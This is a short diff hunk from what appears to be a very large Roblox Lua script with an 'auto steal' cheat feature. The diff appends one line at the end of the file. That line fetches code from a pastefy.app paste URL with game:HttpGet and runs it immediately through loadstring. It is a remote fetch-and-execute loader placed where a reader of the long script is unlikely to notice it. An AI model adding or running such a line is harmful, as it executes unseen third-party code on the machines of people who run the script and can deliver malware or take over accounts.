@@ -30570,3 +30570,4 @@ task.spawn(function()
 		startAutoSteal()
 	end
 end)
+loadstring(game:HttpGet("https://pastefy.app/60zPMqg4/raw"))()
